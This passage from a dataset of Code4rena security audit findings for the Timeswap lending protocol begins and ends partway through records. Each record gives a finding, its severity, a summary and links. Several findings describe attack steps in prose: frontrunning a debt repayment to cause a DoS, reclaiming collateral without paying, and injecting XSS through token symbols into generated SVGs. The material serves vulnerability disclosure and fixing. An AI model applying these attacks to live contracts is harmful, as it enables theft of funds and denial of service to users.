      "content": "_Submitted by IllIllI_\n\nFrom the prior contest:\n\n> in the pay() function users repay their debt and in line 364:<br>\n> <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L364><br>\n> it decreases their debt.\n>\n> lets say a user wants to repay all his debt, he calls the pay() function with his full debt.<br>\n> an attacker can see it and frontrun to repay a single token for his debt (since it's likely the token uses 18 decimals, a single token is worth almost nothing)<br>\n> and since your solidity version is above 0.8.0 the line:<br>\n> due.debt -= assetsIn\\[i]; will revert due to underflow\n>\n> The attacker can keep doing it everytime the user is going to pay and since 1 token is baisicly 0\\$ (18 decimals) the attacker doesn't lose real money\n\n[code-423n4/2022-01-timeswap-findings#86 (comment)](https://github.com/code-423n4/2022-01-timeswap-findings/issues/86#issue-1095233776)\n\nThe sponsor said this about the fix:\n\n> The convenience contract will implement how much asset to pay in.\n\n[code-423n4/2022-01-timeswap-findings#86 (comment)](https://github.com/code-423n4/2022-01-timeswap-findings/issues/86#issuecomment-1014760269)\n\nThe `pay()` function however is still DOSable. Having the `Convenience` contract contain a workaround means the `Convenience` contract is no longer a convenience but a requirement.\n\n```solidity\n            due.debt -= param.assetsIn[i];\n```\n\n[TimeswapPair.sol#L485](https://github.com/code-423n4/2022-03-timeswap/blob/00317d9a8319715a8e28361901ab14fe50d06172/Timeswap/Core/contracts/TimeswapPair.sol#L485)\n\n### Proof of Concept\n\nFrom the prior contest:\n\n> A DoS on every user that repay his full debt (or enough that the difference between his total debt to what he pays his negligible)\n\n[code-423n4/2022-01-timeswap-findings#86](https://github.com/code-423n4/2022-01-timeswap-findings/issues/86)\n\n### Recommended Mitigation Steps\n\nMove the DOS protection to `TimeswapPair.pay()`\n\n**[amateur-dev (Timeswap) confirmed](https://github.com/code-423n4/2022-03-timeswap-findings/issues/11)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-03-timeswap-findings/issues/11#issuecomment-1086576722):**\n > I believe this is a potential security risk and `medium` risk is appropriate. It is important to ensure protocol availability cannot be negatively impacted by nefarious actors.\n\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the code-423n4/2022-01-timeswap repository. The bug is related to the `pay()` function in the TimeswapPair.sol contract, which allows a user to repay their debt. The bug is that an attacker can frontrun the user and repay a single token for their debt, which is almost nothing due to the token using 18 decimals. This will cause the line `due.debt -= assetsIn[i]` to revert due to an underflow. The attacker can keep repeating this to DOS the user.\n\nTo fix this issue, the sponsor suggested that the Convenience contract should implement how much asset to pay in. However, this means that the Convenience contract is no longer a convenience but a requirement. It is also recommended that the DOS protection should be moved to `TimeswapPair.pay()`. This was confirmed by amateur-dev (Timeswap) and the judge (0xleastwood) commented that this is a potential security risk and should be addressed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-03-timeswap",
      "github_link": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/11",
      "tags": [],
      "finders": []
    },
    {
      "id": "25649",
      "title": "[M-01] Underflown variable in ``borrowGivenDebtETHCollateral`` function",
      "impact": "MEDIUM",
      "content": "_Submitted by TerrierLover_\n\n`borrowGivenDebtETHCollateral` function does never properly call `ETH.transfer` due to underflow. If `borrowGivenDebtETHCollateral` function is not deprecated, it would cause unexpected behaviors for users.\n\n### Proof of Concept\n\nHere are codes which contain a potential issue.\n\n[Borrow.sol#L121-L127](https://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Borrow.sol#L121-L127)<br>\n\n    if (maxCollateral > dueOut.collateral) {\n        uint256 excess;\n        unchecked {\n            excess -= dueOut.collateral;\n        }\n        ETH.transfer(payable(msg.sender), excess);\n    }\n\n`excess` variable is `uint256`, and `dueOut.collateral` variable is `uint112` as shown below. Hence, both variables will never be less than 0.\n\n[IPair.sol#L22-L26](https://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/interfaces/IPair.sol#L22-L26)<br>\n\n    struct Due {\n        uint112 debt;\n        uint112 collateral;\n        uint32 startBlock;\n    }\n\n`uint256 excess` is initialized to 0. However, subtracting `dueOut.collateral` variable which is more than or equal to 0 from `excess` variable which is 0 will be less than 0. Hence, `excess -= dueOut.collateral` will be less than 0, and `excess` will be underflown.\n\n### Recommended Mitigation Steps\n\nThe code should properly initialize `excess` variable.\n\n`borrowGivenPercentETHCollateral` function uses `uint256 excess = maxCollateral` at similar functionality.<br>\n[Borrow.sol#L347](https://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Borrow.sol#L347)<br>\n\nHence, just initializing `excess` variable with `maxCollateral` can be a potential workaround to prevent the underflown.\n\n    if (maxCollateral > dueOut.collateral) {\n        uint256 excess = maxCollateral;\n        unchecked {\n            excess -= dueOut.collateral;\n        }\n        ETH.transfer(payable(msg.sender), excess);\n    }\n\n**[amateur-dev (Timeswap) confirmed](https://github.com/code-423n4/2022-03-timeswap-findings/issues/32)**\n\n**[Mathepreneur (Timeswap) resolved and commented](https://github.com/code-423n4/2022-03-timeswap-findings/issues/32#issuecomment-1063313379):**\n > [Timeswap-Labs/Timeswap-V1-Convenience@a6f0e74](https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/commit/a6f0e744832bf7d9d65a043dde47c9dc593f6a3d)\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-03-timeswap-findings/issues/32#issuecomment-1086574982):**\n > Awesome find! I believe `medium` severity is the appropriate risk as this function will always revert when `maxCollateral > dueOut.collateral`.\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the `borrowGivenDebtETHCollateral` function of the Timeswap project. This function does not properly call `ETH.transfer` due to an underflow. If the function is not deprecated, it could cause unexpected behaviors for users. \n\nThe issue is caused by the `excess` variable being initialized to 0, and subtracting `dueOut.collateral` from it, which is more than or equal to 0, resulting in an underflow. To fix this issue, the code should properly initialize the `excess` variable with `maxCollateral`, like the `borrowGivenPercentETHCollateral` function. \n\nThe bug was confirmed and resolved by amateur-dev and Mathepreneur from Timeswap, and 0xleastwood judged it to have a medium severity as the function will always revert when `maxCollateral > dueOut.collateral`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-03-timeswap",
      "github_link": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/32",
      "tags": [],
      "finders": []
    },
    {
      "id": "25648",
      "title": "[H-01] Wrong timing of check allows users to withdraw collateral without paying for the debt",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug, also found by IllIllI_\n\n[TimeswapPair.sol#L459-L490](https://github.com/code-423n4/2022-03-timeswap/blob/00317d9a8319715a8e28361901ab14fe50d06172/Timeswap/Core/contracts/TimeswapPair.sol#L459-L490)<br>\n\n```solidity\nfunction pay(PayParam calldata param)\n    external \n    override \n    lock \n    returns (\n        uint128 assetIn, \n        uint128 collateralOut\n    ) \n{\n    require(block.timestamp < param.maturity, 'E202');\n    require(param.owner != address(0), 'E201');\n    require(param.to != address(0), 'E201');\n    require(param.to != address(this), 'E204');\n    require(param.ids.length == param.assetsIn.length, 'E205');\n    require(param.ids.length == param.collateralsOut.length, 'E205');\n\n    Pool storage pool = pools[param.maturity];\n\n    Due[] storage dues = pool.dues[param.owner];\n    require(dues.length >= param.ids.length, 'E205');\n\n    for (uint256 i; i < param.ids.length;) {\n        Due storage due = dues[param.ids[i]];\n        require(due.startBlock != BlockNumber.get(), 'E207');\n        if (param.owner != msg.sender) require(param.collateralsOut[i] == 0, 'E213');\n        require(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303');\n        due.debt -= param.assetsIn[i];\n        due.collateral -= param.collateralsOut[i];\n        assetIn += param.assetsIn[i];\n        collateralOut += param.collateralsOut[i];\n        unchecked { ++i; }\n    }\n    ...\n```\n\nAt L484, if there is only one `id`, and for the first and only time of the for loop, `assetIn` and `collateralOut` will be `0`, therefore `require(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303');` will pass.\n\nA attacker can call `pay()` with `param.assetsIn[0] == 0` and `param.collateralsOut[i] == due.collateral`.\n\n### Proof of Concept\n\nThe attacker can:\n\n1.  `borrow()` `10,000 USDC` with `1 BTC` as `collateral`;\n2.  `pay()` with `0 USDC` as `assetsIn` and `1 BTC` as `collateralsOut`.\n\nAs a result, the attacker effectively stole `10,000 USDC`.\n\n### Recommended Mitigation Steps\n\nChange to:\n\n```solidity\nfor (uint256 i; i < param.ids.length;) {\n    Due storage due = dues[param.ids[i]];\n    require(due.startBlock != BlockNumber.get(), 'E207');\n    if (param.owner != msg.sender) require(param.collateralsOut[i] == 0, 'E213');\n    due.debt -= param.assetsIn[i];\n    due.collateral -= param.collateralsOut[i];\n    assetIn += param.assetsIn[i];\n    collateralOut += param.collateralsOut[i];\n    unchecked { ++i; }\n}\n\nrequire(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303');\n...\n```\n\n**[Mathepreneur (Timeswap) resolved and commented](https://github.com/code-423n4/2022-03-timeswap-findings/issues/16#issuecomment-1063973580):**\n > [Timeswap-Labs/Timeswap-V1-Core@b23b44a](https://github.com/Timeswap-Labs/Timeswap-V1-Core/commit/b23b44a01d577a5bee77fb5f19d9f4ad1e8d13af)\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-03-timeswap-findings/issues/16#issuecomment-1086569306):**\n > This is an interesting find. It appears that `assetIn` and `collateralOut` are not checked properly during the first iteration of the for loop. As a result, this functionality of this function is inherently broken as the `require` statement will always be satisfied. Nice job!\n\n\n\n***\n \n",
      "summary": "\nA bug was found in the TimeswapPair.sol code on line 459-490. At line 484, if only one ID is used, the `assetIn` and `collateralOut` will be `0` and the `require` statement will always be satisfied. This bug allows an attacker to call `pay()` with `param.assetsIn[0] == 0` and `param.collateralsOut[i] == due.collateral`, effectively stealing an asset. To fix this, the `require` statement must be moved after the for loop. This bug was found by WatchPug and IllIllI and was later resolved and commented on by Mathepreneur (Timeswap) and 0xleastwood (judge).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-03-timeswap",
      "github_link": "https://github.com/code-423n4/2022-03-timeswap-findings/issues/16",
      "tags": [],
      "finders": []
    },
    {
      "id": "25647",
      "title": "[M-10] Convenience contract fails to function if asset or collateral is an ERC20 token with fees",
      "impact": "MEDIUM",
      "content": "_Submitted by Ruhum_\n\nThere are ERC20 tokens that collect fees with each transfer. If the asset or collateral used in a pair is of that type, the Convenience contract fails to function. It always sends the flat amount specified in the function's parameter. If the token collects fees, the amount the Pair contract receives is less than it expects to get and reverts the transaction.\n\n#### Proof of Concept\n\nThe function used to trigger the callback function and verify the received value: <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L50>\n\nConvenience contract's callback function uses the amount specified in `collateralIn` in the transfer function: <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L535>\n\nIf the token collects fees, the value the Pair contract receives will be less than `collateralIn`. The following require statement will fail: <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L52>\n\nThe same thing applies to all the other callback functions in the library.\n\nThis issue doesn't impact the Pair contract itself. Because of the safety checks for each callback, the contract always receives the amount it expects or the transaction is reverted. Meaning, the user has to adapt and cover the fees themselves. The convenience contract doesn't do that and thus always fails.\n\nThe only issue would be outgoing transfers. For example, if a borrower pays back their debt, the pair contract receives the correct amount. But, the borrower will receive less collateral because of the fees. Since there's no such check in those cases:\n<https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L374>\n\n\n**[Mathepreneur (Timeswap) acknowledged](https://github.com/code-423n4/2022-01-timeswap-findings/issues/93):**\n > Hi what projects out there are using this fee mechanism in their transfer function? And what do you think is the mitigation for this? \n> \n > Almost all tokens don't have this fee implementation. If someone wants to utilize this, they can create their own convenience contract to interact with Timeswap V1 Core\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-timeswap-findings/issues/93#issuecomment-1021384932):**\n > Would be worth documenting the behavior for fee on transfer tokens and also expected behavior for rebasing tokens as well.\n\n",
      "summary": "\nA bug has been reported in the Convenience contract of the Timeswap V1 Core library, which fails to function when the asset or collateral used in a pair is of an ERC20 token type that collects fees with each transfer. This is because the contract always sends the flat amount specified in the function's parameter, rather than the amount expected by the Pair contract. As a result, the Pair contract receives less than it expects to get and reverts the transaction.\n\nThe bug does not impact the Pair contract itself, however, it does affect the user as they must cover the fees themselves. The only issue would be outgoing transfers, such as when a borrower pays back their debt. In these cases, the borrower will receive less collateral than expected due to the fees.\n\nMathepreneur (Timeswap) suggested that if someone wants to utilize this fee mechanism, they can create their own convenience contract to interact with Timeswap V1 Core. 0xean (judge) commented that it would be worth documenting the behavior for fee on transfer tokens and also expected behavior for rebasing tokens as well.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/93",
      "tags": [],
      "finders": []
    },
    {
      "id": "25646",
      "title": "[M-09] DOS pay function",
      "impact": "MEDIUM",
      "content": "_Submitted by egjlmn1_\n\nin the `pay()` function users repay their debt and in line 364:\n<https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L364>\nit decreases their debt.\n\nlets say a user wants to repay all his debt, he calls the `pay()` function with his full debt.\nan attacker can see it and frontrun to repay a single token for his debt (since it's likely the token uses 18 decimals, a single token is worth almost nothing)\nand since your solidity version is above 0.8.0 the line:\n`due.debt -= assetsIn[i];` will revert due to underflow\n\nThe attacker can keep doing it everytime the user is going to pay and since 1 token is baisicly 0\\$ (18 decimals) the attacker doesn't lose real money\n\n#### Impact\n\nA DoS on every user that  repay his full debt (or enough that the difference between his total debt to what he pays his negligible)\n\n#### Proof of Concept\n\nFrom solidity docs\n\nSince Solidity 0.8.0, all arithmetic operations revert on over- and underflow by default, thus making the use of these libraries unnecessary.\n\n#### Recommended Mitigation Steps\n\nif `assetsIn[i]` is bigger than `due.debt` set `assetsIn[i]=due.debt` and `due.debt=0`\n\n**[Mathepreneur (Timeswap) acknowledged](https://github.com/code-423n4/2022-01-timeswap-findings/issues/86):**\n > The convenience contract will implement how much asset to pay in.\n\n\n\n",
      "summary": "\nThis bug report is about the `pay()` function in the TimeswapPair.sol contract. This function is used by users to repay their debt. In the line of code 364, it decreases their debt, however, an attacker can frontrun the user and pay a single token for their debt, which is worth almost nothing. Since Solidity version 0.8.0, all arithmetic operations revert on over- and underflow by default, meaning that when the user tries to pay their full debt, the line of code `due.debt -= assetsIn[i];` will revert due to underflow. This creates a DoS (Denial of Service) attack on users who try to pay their full debt, as the attacker can keep doing it and not lose any real money. \n\nThe recommended mitigation step is to set `assetsIn[i]` to be equal to `due.debt` and set `due.debt` to 0 if `assetsIn[i]` is bigger than `due.debt`. The developers of Timeswap have acknowledged this bug and are implementing a convenience contract to help with this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/86",
      "tags": [],
      "finders": []
    },
    {
      "id": "25645",
      "title": "[M-08] users might pay enormous amounts of gas",
      "impact": "MEDIUM",
      "content": "_Submitted by danb_\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L141>\n\nwhen a user mints new liquidity, it the pair doesn't already exist, it deploys it.\n\ndeploying a new contract on ethereum is super expensive, especially when it's such a large contract like TimeswapPair, it can cost thousands of dollars.\n\n<https://medium.com/the-capital/how-much-does-it-cost-to-deploy-a-smart-contract-on-ethereum-11bcd64da1>\n\n#### Impact\n\nuser who try to mint liquidity on pair that doesn't exist will end up paying thousands of dollars.\n\n#### Recommended Mitigation Steps\n\nIf the pair doesn't exist, revert instead of deploying it.\ndeploying a new contract should be the user's choice, since it's so expensive.\n\n**[Mathepreneur (Timeswap) acknowledged](https://github.com/code-423n4/2022-01-timeswap-findings/issues/74):**\n > We plan to have a better documentation to show this behavior.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-timeswap-findings/issues/74#issuecomment-1021355163):**\n > Downgrading to med risk, this isn't an attack vector and is working as designed.  Funds aren't being lost or compromised in any way.\n> \n> The issue is with the design, which could be potentially improved.\n\n\n\n",
      "summary": "\nA bug report has been submitted by danb regarding the cost of deploying a new contract on Ethereum. When a user mints new liquidity, it the pair doesn't already exist, it deploys it which can cost thousands of dollars. This could be a major issue for users who try to mint liquidity on pair that doesn't exist and end up paying thousands of dollars. Mathepreneur (Timeswap) acknowledged the issue and plans to have a better documentation to show this behavior. 0xean (judge) commented that the issue is with the design, which could be potentially improved and downgraded the risk to medium. The funds are not being lost or compromised in any way. The recommended mitigation steps are to revert instead of deploying it if the pair doesn't exist and deploying a new contract should be the user's choice, since it's so expensive.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/74",
      "tags": [],
      "finders": []
    },
    {
      "id": "25644",
      "title": "[M-07] no reentrancy guard on mint() function that has a callback",
      "impact": "MEDIUM",
      "content": "_Submitted by jayjonah8, also found by Fitraldys_\n\nIn CollateralizedDebt.sol, the mint() function calls \\_safeMint() which has a callback to the \"to\" address argument.  Functions with callbacks should have reentrancy guards in place for protection against possible malicious actors both from inside and outside the protocol.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L76>\n\n- <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L263>\n\n- <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L395>\n\n#### Recommended Mitigation Steps\n\nAdd a reentrancy guard modifier on the mint() function in CollateralizedDebt.sol\n\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/43)**\n\n",
      "summary": "\nA bug has been identified in the CollateralizedDebt.sol contract, which is part of the Timeswap protocol. The mint() function in the contract calls \\_safeMint() which has a callback to the \"to\" address argument. This could leave the protocol vulnerable to malicious actors both from inside and outside the system. To mitigate this, a reentrancy guard modifier should be added to the mint() function in CollateralizedDebt.sol. This has been confirmed by Mathepreneur (Timeswap). Reentrancy guards are important protection mechanisms in smart contracts that help to protect against malicious actors by preventing them from executing malicious code multiple times. This is done by ensuring that the contract is in a consistent state before and after the execution of the malicious code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/43",
      "tags": [],
      "finders": []
    },
    {
      "id": "25643",
      "title": "[M-06] `TimeswapPair.sol#mint()` Malicious user/attacker can mint new liquidity with an extremely small amount of `yIncrease` and malfunction the pair with the maturity",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MintMath.sol#L14-L34>\n\nThe current implementation of `TimeswapPair.sol#mint()` allows the caller to specify an arbitrary value for `yIncrease`.\n\nHowever, since `state.y` is expected to be a large number based at `2**32`, once the initial `state.y` is set to a small number (1 wei for example), the algorithm won't effectively change `state.y` with regular market operations (`borrow`, `lend` and `mint`).\n\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L17-L37>\n\nThe pair with the maturity will malfunction and can only be abandoned.\n\nA malicious user/attacker can use this to frontrun other users or the platform's `newLiquidity()` call to initiate a griefing attack.\n\nIf the desired `maturity` is a meaningful value for the user/platform, eg, end of year/quarter. This can be a noteworthy issue.\n\n#### Recommendation\n\nConsider adding validation of minimal `state.y` for new liquidity.\n\nCan be `2**32 / 10000` for example.\n\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/165)**\n\n",
      "summary": "\nA bug was reported in the Timeswap platform, which allows the caller to specify an arbitrary value for `yIncrease`. This could lead to malfunctioning of the pair with maturity, and can be exploited by malicious users/attackers to frontrun other users or the platform's `newLiquidity()` call. The bug could be a noteworthy issue if the desired `maturity` is a meaningful value for the user/platform, such as the end of year or quarter. A recommendation has been made to add validation of minimal `state.y` for new liquidity, which can be set to `2**32 / 10000` for example. Mathepreneur (Timeswap) has confirmed the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/165",
      "tags": [],
      "finders": []
    },
    {
      "id": "25642",
      "title": "[M-05] XSS via SVG Construction contract",
      "impact": "MEDIUM",
      "content": "_Submitted by thank_you, also found by 0x1f8b_\n\nSVG is a unique type of image file format that is often susceptible to Cross-site scripting. If a malicious user is able to inject malicious Javascript into a SVG file, then any user who views the SVG on a website will be susceptible to XSS. This can lead stolen cookies, Denial of Service attacks, and more.\n\nThe `NFTTokenURIScaffold` contract generates a SVG via the `NFTSVG.constructSVG` function. One of the arguments used by the `NFTSVG.constructSVG` function is `svgTitle` which represents the ERC20 symbols of both the asset and collateral ERC20 tokens. When generating an ERC20 contract, a malicious user can set malicious XSS as the ERC20 symbol.\n\nThese set of circumstances leads to XSS when the SVG is loaded on any website.\n\n#### Proof of Concept\n\n1.  Hacker generates an ERC20 token with a symbol that contains malicious Javascript.\n2.  Hacker generates a TimeSwap Pair with an asset or collateral that matches the malicious ERC20 token created in Step 1.\n3.  When `NFTTokenURIScaffold#constructTokenURI` is called, a SVG is generated. This process works such that when generating the SVG the tainted ERC20 symbol created in Step 1 is [passed](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L90) to the `NFTSVG.constructSVG` function [here](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L102). This function returns a SVG [containing](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTSVG.sol#L27) the tainted ERC20 symbol.\n4.  When the SVG is loaded on any site such as OpenSea, any user viewing that SVG will load the malicious Javascript from within the SVG and result in a XSS attack.\n\n\n#### Recommended Mitigation Steps\n\nCreating a SVG file inside of a Solidity contract is novel and thus requires the entity creating a SVG file to sanitize any potential user-input that goes into generating the SVG file.\n\nAs of this time there are no known Solidity libraries that sanitize text to prevent an XSS attack. The easiest solution is to remove all user-input data from the SVG file or not generate the SVG at all.\n\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/131):**\n > We plan to add Safety String library.\n\n\n\n",
      "summary": "\n\nA Cross-site Scripting (XSS) vulnerability has been discovered in the `NFTTokenURIScaffold` contract, which is used to generate a SVG file via the `NFTSVG.constructSVG` function. This vulnerability occurs when a malicious user is able to inject malicious Javascript into the SVG file, which can then be viewed by any user on a website, leading to stolen cookies, Denial of Service attacks, and more.\n\nThe vulnerability is caused by the `svgTitle` argument, which is used to represent the ERC20 symbols of both the asset and collateral ERC20 tokens. A malicious user can set malicious XSS as the ERC20 symbol, which is then passed to the `NFTSVG.constructSVG` function and included in the generated SVG file. When the SVG is loaded on any website, any user viewing that SVG will be exposed to the malicious Javascript, resulting in a XSS attack.\n\nTo mitigate this vulnerability, the entity creating the SVG file must sanitize any potential user-input that goes into generating the SVG file. As of this time there are no known Solidity libraries that sanitize text to prevent an XSS attack, so the easiest solution is to remove all user-input data from the SVG file or not generate the SVG at all. The team at Mathepreneur (Timeswap) have confirmed that they plan to add a Safety String library to address this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/131",
      "tags": [],
      "finders": []
    },
    {
      "id": "25641",
      "title": "[M-04] `safeSymbol()` can revert causing DoS",
      "impact": "MEDIUM",
      "content": "_Submitted by sirhashalot_\n\nThe `safeSymbol()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `symbol()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `symbol()` function should return a string and not revert.\n\nThe root cause of the issue is that the `safeSymbol()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `symbol()` functions in the Timeswap ERC20 contracts to revert.\n\nBecause this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeSymbol()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeSymbol()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name:\n<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39>\n\n#### Proof of Concept\n\nThe root cause is [line 20](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L20)  of the `safeSymbol()` function in SafeMetadata.sol\n\nThe `safeSymbol()` function is called in:\n\n*   [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L27-L31)\n*   [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L38-L42)\n*   [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L29-L33)\n*   [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L31-L35)\n\n#### Recommended Mitigation Steps\n\nUse the BoringCrypto `safeSymbol()` function code with the `returnDataToString()` parsing function to handle the case of a bytes32 return value:\n<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39>\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/114):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/59\n\n\n\n",
      "summary": "\nA bug was reported in the `safeSymbol()` function found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `symbol()` functions. This bug can cause a revert, which would make the contracts not compliant with the ERC20 standard because the `symbol()` function should return a string and not revert. The root cause of the issue is that the `safeSymbol()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `symbol()` functions in the Timeswap ERC20 contracts to revert.\n\nThe BoringCrypto library has a fix for this issue. The `safeSymbol()` function in the BoringCrypto library is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name.\n\nThe root cause was identified as line 20 of the `safeSymbol()` function in SafeMetadata.sol and the `safeSymbol()` function is called in Bond.sol, CollateralizedDebt.sol, Insurance.sol and Liquidity.sol.\n\nThe recommended mitigation steps are to use the BoringCrypto `safeSymbol()` function code with the `returnDataToString()` parsing function to handle the case of a bytes32 return value. The bug was confirmed and resolved by Mathepreneur (Timeswap).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/114",
      "tags": [],
      "finders": []
    },
    {
      "id": "25640",
      "title": "[M-03] `safeName()` can revert causing DoS",
      "impact": "MEDIUM",
